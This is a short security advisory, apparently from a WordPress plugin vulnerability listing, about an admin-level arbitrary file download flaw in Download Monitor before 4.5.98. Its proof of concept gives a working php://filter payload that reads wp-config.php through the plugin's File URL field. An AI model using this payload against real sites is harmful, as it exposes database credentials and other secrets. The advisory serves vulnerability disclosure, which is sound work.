## WordPress Plugin Vulnerabilities

# Download Monitor < 4.5.98 - Admin+ Arbitrary File Download

### Description

The plugin does not ensure that files to be downloaded are inside the blog folders, and not sensitive, allowing high privilege users such as admin to download the wp-config.php or /etc/passwd even in an hardened environment or multisite setup.

### Proof of Concept

Create a new download on:
https://target-site/wp-admin/post-new.php?post\_type=dlm\_download
Add the following payload to the "File URL(s); note: only enter multiple URLs in here if you want to use file mirrors" field when creating a new Download:
php://filter/convert.base64-encode/resource=/var/www/vhosts/developerspace.de/httpdocs/blog/wp-config.php
Navigate to the newly created download page.
